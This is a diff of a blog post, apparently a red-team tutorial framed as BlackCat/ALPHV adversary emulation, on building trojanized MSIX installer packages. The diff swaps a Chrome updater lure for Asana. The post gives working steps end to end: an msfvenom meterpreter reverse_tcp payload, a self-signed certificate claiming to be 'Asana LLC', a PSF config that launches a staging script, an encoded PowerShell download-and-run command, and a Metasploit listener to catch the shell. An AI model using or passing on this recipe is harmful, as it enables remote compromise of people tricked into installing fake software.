@@ -1,5 +1,5 @@
 ---
-title: "Creating malicious [.msix] Chrome Updater files for initial access"
+title: "Creating malicious .MSIX files for initial access"
 author: "Trevor saudi"
 date: 2024-06-11
 description: ""
@@ -40,7 +40,7 @@ subtitle: ""
 
 ## Introduction
 
-- I recently worked on a project involving adversary emulation of the `BlackCat/ALPHV ransomware operation`. Part of the observed TTPs was abuse of the Windows App installer to create malicous `Chrome updater files` for initial access. These updater files come in (.msix) file extension which is a windows installer package.
+- I recently worked on a project involving adversary emulation of the `BlackCat/ALPHV ransomware operation`. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a windows installer package.
 <br>
 - In this article, we will go over the .msix file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment.
 
@@ -67,7 +67,7 @@ subtitle: ""
 
 ### Why MSIX
 
-- One interesting feature about the MSIX package format is that it supports differential updates, meaning, only the parts of the application that have changed can be updated using a single setup file. This allows for creation of udpater files for various applications such as Chrome in this case.
+- One interesting feature about the MSIX package format is that it supports differential updates, meaning, only the parts of the application that have changed can be updated using a single setup file. This allows for creation of udpater files for various applications.
 
 ## Package Support Framework
 
@@ -165,7 +165,7 @@ sample </a> from malwarebazaar.
 
 ## Building a malicious msix for Initial Access
 
-- Now that we have a solid understanding of the file structure. Let us construct our own malicious MSIX payload that performs a Chrome update when installing before executing our target malware.
+- Now that we have a solid understanding of the file structure. Let us construct our own malicious MSIX payload that installs an application before executing our target malware.
 
 ### 1. Setting up the MSIX packaging tool and our setup file
 
@@ -175,7 +175,7 @@ sample </a> from malwarebazaar.
 <img src="/posts/2024-06-11_asd/images/msixpackagingtool.png"> 
 </div>
 
-- You will also need the Chrome setup file or whichever application you will be packaging.
+- You will also need the target application being packaged. I used Asana for this example.
 
 ### 2. The implant being staged
 
@@ -210,7 +210,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 
 1. Create a new self signed certificate
 
 ```powershell
-New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3", "2.5.29.19={text}")-Type Custom -KeyUsage DigitalSignature -Subject "Google Chrome LLC" -FriendlyName "Google Chrome LLC"
+New-SelfSignedCertificate -CertStoreLocation "Cert:\CurrentUser\My" -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3", "2.5.29.19={text}")-Type Custom -KeyUsage DigitalSignature -Subject "Asana LLC" -FriendlyName "Asana LLC"
 
 ```
 
@@ -235,10 +235,21 @@ Export-PfxCertificate -Password $password -cert "Cert:\CurrentUser\My\1BB13615AD
 Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792" -FilePath 'C:\Users\Saudi\cert.cer'
 ```
 
+<img src="/posts/2024-06-11_asd/images/certificate.png"> 
+
+- Since this is a self signed SSL for testing purposes, you can install the security certificate on the victim as shown:
+
+<img src="/posts/2024-06-11_asd/images/installcert.png"> 
+
+
+<img src="/posts/2024-06-11_asd/images/localmachine.png">
 
 
 
-<img src="/posts/2024-06-11_asd/images/cert.png"> 
+- Install the cert in the Trusted Root Certification Authorities
+
+<img src="/posts/2024-06-11_asd/images/rootcert.png"> 
+
 
 
 ### 4. Bundle the package and stage our loader
@@ -247,28 +258,25 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 
 <img src="/posts/2024-06-11_asd/images/msixpackage1.png"> 
 
-- Select the Chrome setup file as the installer being packaged and select the pfx certificate we generated.
+- Select the Asana setup file as the installer being packaged and select the pfx certificate we generated.
 
-<img src="/posts/2024-06-11_asd/images/msixpackage2.png"> 
+<img src="/posts/2024-06-11_asd/images/asanainstaller.png"> 
 
-- Add the package information
-
-<img src="/posts/2024-06-11_asd/images/chromeupdater.png"> 
 
 - You can skip the Accelerator section. The package will automatically install in the system as shown
 
 
-<img src="/posts/2024-06-11_asd/images/isntall.png">
+<img src="/posts/2024-06-11_asd/images/installation.png">
 
-- We skip this as well and head over to create the package
+- Ensure the package has an entry point as shown. We will edit the entry point in the manifest file later on to point to our psflauncher executable
 
-<img src="/posts/2024-06-11_asd/images/newpackage1.png">
+<img src="/posts/2024-06-11_asd/images/entrypoint.png">
 
-
-- Click on Package Files
+- Here in the Create New Package Section, we go to the package editor to add the PSF binaries and config file to our package to give it PSF support.
 
 
 <img src="/posts/2024-06-11_asd/images/packageeditor.png">
+
 
 - In the package editor, click on package files, right click on the "Package" and add the following appropriate files
 
@@ -277,14 +285,14 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 
 <img src="/posts/2024-06-11_asd/images/filestocopy.png" width=1000px;>
 
-- You can edit files directly in the package editor byt right clicking and selecting edit. Let's modify the config file to point to our staging script called Hotfix.ps1
+- You can edit files directly in the package editor byt right clicking and selecting edit. Let's modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors. 
 
 ```javascript
 {
   "applications": [
     {
-      "id": "CHROME",
-      "executable": "ChromeSetup.exe",
+      "id": "ASANA",
+      "executable": "asana.exe",
       "scriptExecutionMode": "-ExecutionPolicy Unrestricted",
       "startScript": {
         "waitForScriptToFinish": true,
@@ -306,3 +314,41 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 powershell -enc "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA="
 ```
 
+- Add the hotfix.ps1 staging script
+
+<img src="/posts/2024-06-11_asd/images/hotfix.png" width=1000px;>
+
+- Back to the manifest file, let's change the launch executable to our PSF binary so that the hotfix.ps1 can be executed post install
+
+<img src="/posts/2024-06-11_asd/images/manifest.png">
+
+- In this section, take note of the Application ID defined. We will also modify the executable value
+
+<img src="/posts/2024-06-11_asd/images/entrypoint1.png">
+
+- Change it to point to the psf executable:
+
+<img src="/posts/2024-06-11_asd/images/psflauncher.png">
+
+- Save and exit. Finally create your MSIX file.
+
+## Testing our malicious sample
+
+- *****  Ensure that the Asana application is not installed in the system
+
+<img src="/posts/2024-06-11_asd/images/asanainstaller2.png">
+
+
+- Setup our listener
+
+```bash
+msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.71;set LPORT 9001; set EXITFUNC thread; set EXITONSESSION false; exploit -j" 2>&1
+```
+
+<img src="/posts/2024-06-11_asd/images/listener.png">
+
+- Run the MSIX installation and catch your shell
+
+<img src="/posts/2024-06-11_asd/images/session1.png">
+
+- Happy hacking!
